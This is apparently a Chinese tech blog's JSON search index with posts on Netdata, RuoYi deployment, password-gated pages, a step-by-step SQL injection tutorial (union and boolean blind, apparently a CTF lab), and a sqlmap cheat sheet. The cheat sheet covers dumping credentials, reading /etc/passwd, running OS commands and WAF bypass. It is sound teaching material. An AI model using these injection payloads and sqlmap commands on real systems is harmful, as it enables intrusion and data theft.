1a30059a184cd390eebf70159b4eb902d7ae74591d8333422be47cf8f0cfb9918c7cc861903c73e5ba3df4c01fb71ee4412c669e2c213b261feacadd6df8b16aa2a9acf1b6ad2d0e304da0bc75582465748694d06b4de5a83b3701ac8d6b2a537da6a40fe59f416481270ffe37c26fde35069750dc95d7f57dc3f70f273006e5edb17451b14b14d1939a7bdd464cf6e9f772f70b48aedf21ad79873c43848c9ec0b483879cb442f2c3e032b18adcb3d73eb168bdd686ccbc0a0f99362cdefe802914b1e913ce2bb5620887df8dfd4ab186ebaebe3480b4570041f6dc184b3d55b0d6ccbf620be41beb5a85e3e7f05b1d9ce26d498860c7c4f9c48132501c9a334bdbb8acf5a4741fd99c6d67e81896e6ab0ea994093e2628d8cc04205749ac611513718876cbd1fe6d9f1e9c9064ef139acde2bc541265db26fdbddf1ea99a0c638e3deea849ebbcf9eb17b637045edc96acbc8e4b3ae327bf55909ffd09ba099976973c3c86da54931dfd87aca53ad47b3a998fe44b3abd114f6da3a8b430cb81975e46f9349ab1cb306226e218ec35857298f768681b22241fbc00b99f34982744d862ce4fa392c8937295667d8812b9cf4febe53bd1acd17bd9e579ef919666f6952feb27964ae6dc01d7f82c1551bcc4b3c233fbeb5d704f1d7331e4c0b27e90386341a0f0ef5448f506f9fd4d723090dee7666af31988234d9a2f6dcd5a94307686\",\"name\":\"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a\",\"account\":\"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69\",\"salt\":\"417fc05cf038494f7e41b68ff725a17b\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\"]}];\n                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {\n                  alert(\"请输入信息\");\n                  return;\n                };\n                const id = '8f70eb62';\n                let login = false;\n                let index = -1;\n                for(let i = 0;i","tags":["Linux","RHEL8","练习"]},{"title":"路由交换技术考试","url":"/posts/ef817dbb/","content":"\n          \n              #best-form {\n                  width: 80%;\n                  text-align: center;\n                  margin: auto;\n              }\n              #best-form .inp {\n                  width: 100%;\n                  padding: 1em 0.5em;\n                  margin: 0 0 1em 0;\n                  border: 0;\n                  outline: none;\n                  border-bottom: 2px solid #ccc;\n                  transition: ease .5s;\n              }\n              #best-form .inp:focus {\n                  border: 0;\n                  border-bottom: 2px solid orange;\n              }\n              #best-form input[type='submit'] {\n                  font-size: 1.5em;\n                  background: orange;\n                  padding: 0.2em 0.5em;\n                  color: white;\n                  border-radius: 1em;\n                  cursor: pointer;\n                  border: 0;\n              }\n          \n          \n              刷新页面即可恢复加密\n              \n              \n              \n              \n          \n          \n              const sha256 = (text) => CryptoJS.SHA256(text).toString(CryptoJS.enc.Hex);\n              document.querySelector('#best-form').addEventListener('submit', async function (e) {\n                e.preventDefault();\n                const name = this['best-name'].value;\n                const username = this['best-username'].value;\n                const password = this['best-password'].value;\n                const users = [{\"result\":\"\",\"name\":\"785ca6708470f42b52906f604aed157bcc7f941008981311f0aa68bdef3567ae\",\"account\":\"7c5d7795860f6d3efec596f1f4ec5980d8e5ce47d5f68fa47d43fc0858284022\",\"salt\":\"0c22cc53af5a79f1b902c8877d52f9fe\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\",\"4aad6938451b398c8544546bb8dc9e17f8926d9d92ce3c400d552ffb05a9659b\"]},{\"result\":\"\",\"name\":\"5dca4de7c25ef54fe2d0e3389b7e28e63b715e2911125343e110d31623aee81a\",\"account\":\"cef472f90aeb4b39bcf8dcb875eca6a1c49a77835e697462711199985613ea69\",\"salt\":\"0c22cc53af5a79f1b902c8877d52f9fe\",\"post\":[\"48c1c75e195a66b0dcb20243e5b79532d2412420fd59b5530502baea7e376002\"]}];\n                if(name.trim() === '' || username.trim() === '' || password.trim() === '') {\n                  alert(\"请输入信息\");\n                  return;\n                };\n                const id = 'ef817dbb';\n                let login = false;\n                let index = -1;\n                for(let i = 0;i","tags":["路由","网络","思科"]},{"title":"netdata","url":"/posts/c3d71371/","content":"概述\nNetdata能够帮助用户实时监测系统的性能指标，提供丰富的可视化界面，使用户可以轻松查看各类指标，包括CPU使用率、内存占用、磁盘IO、网络流量等。\nNetdata自身的资源占用非常低，并且非常快。\n安装\napt install netdata\n配置\nvim /etc/netdata/netdata.conf[global]        run as user = netdata        # 这里为了方便用了root，生产环境下禁止用root用户        web files owner = root        web files group = root        # Netdata is not designed to be exposed to potentially hostile        # networks. See https://github.com/netdata/netdata/issues/164        # 这里是为了让所有设备可以访问web页面，可以根据自己的需求来配置        bind socket to IP = 0.0.0.0\n启动\n# 启动前记得放通19999端口service netdata start\n停止\nservice netdata stop\n访问页面\n至此部署成功\n\n","tags":["netdata","系统监控","Centos 7"]},{"title":"Win10 修改默认文件资源管理器","url":"/posts/ce14aeee/","content":"首先安装新的文件管理器，这里以Sigma file manager为例。\n打开注册表\n\n修改数值数据为Sigma file manager的路径\n\n\n重启计算机即可\n","tags":["Win10","文件管理器","注册表"]},{"title":"Web安全 SQL注入","url":"/posts/4fedeb6/","content":"只说步骤，以下均用http://localhost/index.php?id=1来注入。以MySQL为例。\n\n实际情况请考虑转义字符。\n\n用到的函数(根据实际情况使用)\ndatabase()：返回当前所在库。\nlength(string)：返回字符串长度。\nascii(string)：返回字符的ASCII码(int)。\nSUBSTR(string,int1,int2)：截取字符串，int1从1开始计数，是起始位置。int2为截至长度。\n显错注入\n\n检测是否存在SQL注入，下述情况即存在。\n\n-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2\n\n使用order by语句测试有多少字段，注意观察页面变化。这里假设有三个字段。\n\nid=1 order by 3\n\n查看当前所在哪一个库，这里id=5是查不出来数据的，这是为了第一条数据是查出来的库名，后面select语句的1，3是为了占位，因为一共有三个字段。\n\nid=5 union select 1,database(),3\n\n知道库名后(假设为user)，从系统表information_schema.tables查出user库下有哪些表。\n\nid=5 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;user&#x27; limit 0,10\n布尔盲注\n\n检测是否存在SQL注入，下述情况即存在。\n\n-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2\n\n猜测库名长度，这里猜出来是12\n\nid=1 and length(database())&lt;=12\n\n一个字符一个字符的猜测库名(一般会写个脚本猜测，这里解释原理)，ASCII码从48-122包含数字，小写字母，大写字母和一些符号，这里猜测出来库名是 kanwolongxia\n\n-- 类似于这样，直到猜出来库名id=1 and ascii(substr(database(),1,1))&gt;=109id=1 and ascii(substr(database(),1,1))&gt;=103id=1 and ascii(substr(database(),1,1))&gt;=107id=1 and ascii(substr(database(),2,1))&gt;=97id=1 and ascii(substr(database(),3,1))&gt;=110id=1 and ascii(substr(database(),4,1))&gt;=119......\n\n猜解表的数量，这里有3个表\n\nid=1 and (select count(table_name) from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27;)&gt;=3\n\n猜解每个表的名字，第一个表是loflag，第二个表是news，第三个表是user\n\nid=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27; limit 0,1),1,1))&gt;=109\n\n猜解表的数据，先看有几个字段，再猜解表字段是什么。\n\n-- 查看表有几个字段id=1 and (select count(column_name) from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27;)&gt;1-- 猜字段，loflag的第一个字段是Id，第二个字段是flagloid=1 and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27; limit 0,1),1,1))&gt;=97-- 猜解flag，有五条数据，第一条是zKaQ-QQQid=1 and ascii(substr((select flaglo from loflag limit 0,1),1,1))&gt;=97\nHead注入\n尚未更新\n","tags":["网络安全","Web安全","SQL注入"]},{"title":"Win10 部署若依前端分离版","url":"/posts/621e92f2/","content":"环境部署\n\n开发和生产都是此环境\n\nJDK &gt;= 1.8 (推荐1.8版本)Mysql &gt;= 5.7.0 (推荐5.7版本)Redis &gt;= 3.0Maven &gt;= 3.0Node &gt;= 12\n下载源码\n建议用 git clone 来克隆项目。\ngit clone https://gitee.com/y_project/RuoYi-Vue.git\n\n网址：https://ruoyi.vip/\n\n\n\n\n个人习惯，可以不做\n\n将ruoyi-ui移动到上一级目录，并将RuoYi-Vue修改为ruoyi-master\n\n\n开发环境部署\n后端配置和运行\n\n\n\n\n前端配置和运行\n\n\n\n生产环境部署\n\n此处生产环境为Centos7\n\n\n\n\n\n\n详细配置见若依文档https://doc.ruoyi.vip/\n\n\n","tags":["RuoYi","若依管理系统","前端分离版"]},{"title":"sqlmap 注入","url":"/posts/304b10ed/","content":"基本检测\n检测 GET 参数\nsqlmap -u &quot;http://target.com/page?param=value&quot;\n检测 POST 参数\nsqlmap -u &quot;http://target.com/login&quot; --data=&quot;username=admin&amp;password=pass&quot;\n只检测特定参数\nsqlmap -u &quot;http://target.com/page?id=1&amp;name=test&quot; -p id\n添加会话 Cookie\nsqlmap -u &quot;http://target.com/protected&quot; --cookie=&quot;PHPSESSID=abc123&quot;\n指定数据库类型\nsqlmap -u &quot;http://target.com&quot; --dbms=mysql\n使用随机 User-Agent\nsqlmap -u &quot;http://target.com&quot; --random-agent\n使用代理\nsqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot;\n使用 tamper 脚本绕过防护\nsqlmap -u &quot;http://target.com&quot; --tamper=space2comment\n风险级别和测试强度\n–level 参数（测试级别） ​​Level 1​​：仅测试 GET 参数（默认） ​​Level 2​​：测试 GET 和 POST 参数 ​​Level 3​​：增加\nHTTP Cookie 头测试 ​​Level 4​​：增加 HTTP User-Agent 和 Referer 头测试 ​​Level 5​​：测试所有 HTTP 头（包括 Host 头\n）\n–risk 参数（风险级别） ​​Risk 1​​：使用低风险 payload（如基于错误的注入） ​​Risk 2​​：增加基于时间的盲注和布尔盲注\n​​Risk 3​​：使用 OR-based 注入（可能修改数据）\nsqlmap -u &quot;http://target.com&quot; --level=5 --risk=3\n检测数据库版本\nsqlmap -u &quot;http://target.com&quot;  --banner\n检测当前用户\nsqlmap -u &quot;http://target.com&quot; --current-user\n获取所有数据库名称\nsqlmap -u &quot;http://target.com&quot; --dbs\n获取当前数据库名称\nsqlmap -u &quot;http://target.com&quot; --current-db\n获取指定数据库的所有表\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; --tables\n获取当前数据库的所有表\nsqlmap -u &quot;http://target.com&quot; --tables\n获取指定表的所有列\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns\n提取整个表的数据\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --dump\n提取特定列的数据\nsqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; -C &quot;username,password&quot; --dump\n获取数据库用户列表\nsqlmap -u &quot;http://target.com&quot; --users\n获取用户权限\nsqlmap -u &quot;http://target.com&quot; --privileges\n获取操作系统信息\nsqlmap -u &quot;http://target.com&quot; --os-info\n读取服务器文件（需要高权限）\nsqlmap -u &quot;http://target.com&quot; --file-read &quot;/etc/passwd&quot;\n写入文件（需要高权限）\nsqlmap -u &quot;http://target.com&quot; --file-write &quot;local_file.txt&quot; --file-dest &quot;/remote/path/file.txt&quot;\n执行操作系统命令\nsqlmap -u &quot;http://target.com&quot; --os-cmd &quot;id&quot;\n获取交互式 shell\nsqlmap -u &quot;http://target.com&quot; --os-shell\n提取所有数据库的所有数据\nsqlmap -u &quot;http://target.com&quot; --dump-all\n使用多线程加速\nsqlmap -u &quot;http://target.com&quot; --threads=10\n使用代理（如 Burp Suite）\nsqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot;\n使用 tamper 脚本绕过 WAF\nsqlmap -u &quot;http://target.com&quot; --tamper=space2comment\n保存会话以便后续使用\nsqlmap -u &quot;http://target.com&quot; --save\n清除缓存\nsqlmap -u &quot;http://target.com&quot; --purge\n","tags":["sqlmap","Web 安全"]}]